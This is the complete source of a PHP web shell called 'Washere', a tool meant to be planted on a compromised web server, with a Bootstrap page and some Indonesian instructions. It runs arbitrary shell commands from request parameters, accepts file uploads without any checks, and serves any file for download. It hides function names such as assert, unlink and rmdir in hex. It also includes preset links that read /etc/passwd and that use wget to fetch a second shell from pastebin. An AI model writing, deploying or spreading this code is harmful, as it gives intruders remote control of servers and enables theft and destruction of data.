<?php
/*
        [!]   Washere web Shell   team [!]
        [!]   web     shell      xploit[!] 
        [!]                            [!]
        [!]https://github.com/rebel-bit[!]
*/
header('X-XSS-Protection: 0');
error_reporting();
session_start();
clearstatcache();

$Array = [
  '7068705f756e616d65', '70687076657273696f6e', '6368646972', '676574637764', '707265675f73706c6974', '636f7079', '66696c655f6765745f636f6e74656e7473',
  '6261736536345f6465636f6465', '69735f646972', '6f625f656e645f636c65616e28293b', '756e6c696e6b', '6d6b646972', '63686d6f64', '7363616e646972',
  '7374725f7265706c616365', '68746d6c7370656369616c6368617273', '7661725f64756d70', '666f70656e', '667772697465', '66636c6f7365',
  '64617465', '66696c656d74696d65', '737562737472', '737072696e7466', '66696c657065726d73', '746f756368',
  '66696c655f657869737473', '72656e616d65', '69735f6172726179', '69735f6f626a656374',
  '737472706f73', '69735f7772697461626c65', '69735f7265616461626c65',
  '737472746f74696d65', '66696c6573697a65',
  '726d646972',
  '6f625f6765745f636c65616e',
  '7265616466696c65',
  '617373657274',
];
$___ = count($Array);
for ($i = 0; $i < $___; $i++) {
  $TSC[] = uhex($Array[$i]);
}
?>
<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
  <meta name="generator" content="Jekyll v4.1.1">
  <title>washere web shell</title>

  <link rel="canonical" href="https://getbootstrap.com/docs/4.5/examples/cover/">


  <!--- FOnts style --->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap" rel="stylesheet">

  <!-- Bootstrap core CSS -->
  <link href="https://getbootstrap.com/docs/4.5/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">

  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>


  <style>
    body {
      font-family: Kelly Slab;
    }

    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 2.5rem;
      }
    }
  </style>
  <link href="https://getbootstrap.com/docs/4.5/examples/cover/cover.css" rel="stylesheet">
</head>

<body onclick="playAudio();" class="text-center">
  <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
      <div class="inner">
        <h3 class="masthead-brand">[!] WASHERE SHELL [!]</h3>
        <nav class="nav nav-masthead justify-content-center">
          <a class="nav-link" href="?">Home</a>
          <a class="nav-link" href="?shell">Shell</a>
          <a class="nav-link" href="?inject">Upload</a>
          <a class="nav-link" href="?deface">info</a>
    
          <div class="nav-link dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown" style="text-decoration: none">CEK</a>
            <div class="dropdown-menu">
              <a href="?cmd=uname -a" class="dropdown-item">Kernel</a>
              <a href="?cmd=lsb_release -a" class="dropdown-item">Distro</a>
              <a href="?cmd=php -v" class="dropdown-item">Versi PHP</a>
              <a href="?cmd=lscpu" class="dropdown-item">CPU</a>
              <a href="?cmd=free" class="dropdown-item">RAM</a>
              <a href="?cmd=cat /etc/passwd" class="dropdown-item">USER</a>
              <a href="?cmd=id" class="dropdown-item">Group</a>
              <a href="?cmd=wget -O alfa.php https://pastebin.com/raw/61TKRNch" class="dropdown-item">auto up shell</a>
            </div>
          </div>
        </nav>
      </div>
    </header>

    <main role="main" class="inner cover">
      <header>
        <h1 class="title">Washere v.2 Shell</h1>  
        <img src="https://www.freepnglogos.com/uploads/hacker-png/hacker-interpol-arrests-suspected-anonymous-hackers-motley-5.png" width="180" height="180"><br>
      </header>
      <?php
      if (empty($_REQUEST)) {
        echo '<br>';
      } ?>
      <?php

      if (!empty($_GET['cmd'])) {
      ?>
        <div class="form-group">
          <pre>
    <textarea class="form-control" id="exampleFormControlTextarea1" rows="10">
<?= system($_GET['cmd']); ?>
    </textarea>
</pre>

        </div>
        <?php

      }

      if (isset($_GET['inject'])) {
        if (isset($_POST['cekfile'])) {
          move_uploaded_file($_FILES["file"]["tmp_name"], "" . $_FILES["file"]["name"]);
          echo '
<script type="text/javascript">
  Swal.fire({
  title: "Success !",
  text: "Success Upload",
  icon: "success",
  confirmButtonText: "Ok"
})

</script>
 <meta http-equiv="refresh" content="1;url=?inject" />
  ';
        } else {
          echo '
  <form enctype="multipart/form-data" action="" method="post">

<div class="row">
  <div class="col-md-9">
    <div class="custom-file mb-3">
    <input type="file" class="custom-file-input" id="validatedCustomFile" required>
    <label class="custom-file-label" for="validatedCustomFile">Choose file...</label>
  </div>
  </div>
  <div class="col-md-3">
    <input name="cekfile" type="submit" class="btn btn-outline-success btn-block" value="Upload">
  </div>
</div>
</form>


';
        }
      }

      if (isset($_GET['shell'])) {
        if (isset($_POST['x'])) {
          echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action=""  method="POST">
  
  <div class="row">
    <div class="col-md-8 mt-3 form-group">

      <input type="text" class="form-control" name="x" value="ls -l">
    </div>
    <div class="col-md-4 mt-3 form-group">


      <input type="submit" class="btn btn-outline-secondary "  value="Execute">
    </div>
  </div>

</form>';
        ?>
          <div class="form-group">
            <textarea class="form-control" width="250" readonly><?= `{$_POST['x']};` ?> </textarea>
          </div>
          <? die(); ?>
        <?php
        } else {
          echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">

  <div class="row">
    <div class="col-md-8 mt-3 form-group">

      <input type="text" class="form-control" name="x" value="ls -l">
    </div>
    <div class="col-md-4 mt-3 form-group">


      <input type="submit" class="btn btn-outline-secondary btn-block" value="Execute">
    </div>
  </div>

</form>';
        }
      }

      if (isset($_GET['deface'])) {
        if (isset($_POST['x'])) {
          echo '';
        ?>
        <div class="shadow">
          <h4><?php echo $TSC[0]();?></h4>
          <h4><?php echo $TSC[1]();?></h4>
          <h4><?php echo  $_SERVER['SERVER_NAME'];?></h4>
        </div>
           <? die(); ?> <?php
                        } else {
                          echo 'Jika ingin cek info click execute <br /> <br /><form action="" method="POST">

<div class="row">
  <input type="submit" class="btn btn-outline-secondary btn-block" name="x" value="Execute">
</div>

</form>';
                        }
                      }
                          ?> </main>
            <footer class="mastfoot mt-auto">
              <div class="inner">
                <p>Shell By <a href=""> washere</a></p>
              </div>
            </footer>
  </div>


  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

  <?php
  function rec($j)
  {
    global $TSC;
    if (trim(pathinfo($j, PATHINFO_BASENAME), '.') === '') {
      return;
    }
    if ($TSC[8]($j)) {
      array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
      $TSC[35]($j);
    } else {
      $TSC[10]($j);
    }
  }
  function dre($y1, $y2)
  {
    global $TSC;
    ob_start();
    $TSC[16]($y1($y2));
    return $TSC[36]();
  }
  function hex($n)
  {
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
      $y .= dechex(ord($n[$i]));
    }
    return $y;
  }
  function uhex($y)
  {
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
      $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
  }
  function OK()
  {
    global $TSC, $d;
    $TSC[38]($TSC[9]);
    header("Location: ?d=" . hex($d) . "&1");
    exit();
  }
  function ER()
  {
    global $TSC, $d;
    $TSC[38]($TSC[9]);
    header("Location: ?d=" . hex($d) . "&0");
    exit();
  }
  function x($c)
  {
    global $TSC;
    $x = $TSC[24]($c);
    if (($x & 0xC000) == 0xC000) {
      $u = "s";
    } elseif (($x & 0xA000) == 0xA000) {
      $u = "l";
    } elseif (($x & 0x8000) == 0x8000) {
      $u = "-";
    } elseif (($x & 0x6000) == 0x6000) {
      $u = "b";
    } elseif (($x & 0x4000) == 0x4000) {
      $u = "d";
    } elseif (($x & 0x2000) == 0x2000) {
      $u = "c";
    } elseif (($x & 0x1000) == 0x1000) {
      $u = "p";
    } else {
      $u = "u";
    }
    $u .= (($x & 0x0100) ? "r" : "-");
    $u .= (($x & 0x0080) ? "w" : "-");
    $u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
    $u .= (($x & 0x0020) ? "r" : "-");
    $u .= (($x & 0x0010) ? "w" : "-");
    $u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
    $u .= (($x & 0x0004) ? "r" : "-");
    $u .= (($x & 0x0002) ? "w" : "-");
    $u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
    return $u;
  }
  if (isset($_GET["g"])) {
    $TSC[38]($TSC[9]);
    header("Content-Type: application/octet-stream");
    header("Content-Transfer-Encoding: Binary");
    header("Content-Length: " . $TSC[34](uhex($_GET["g"])));
    header("Content-disposition: attachment; filename=\"" . uhex($_GET["g"]) . "\"");
    $TSC[37](uhex($_GET["g"]));
  }
  ?>
</body>

</html>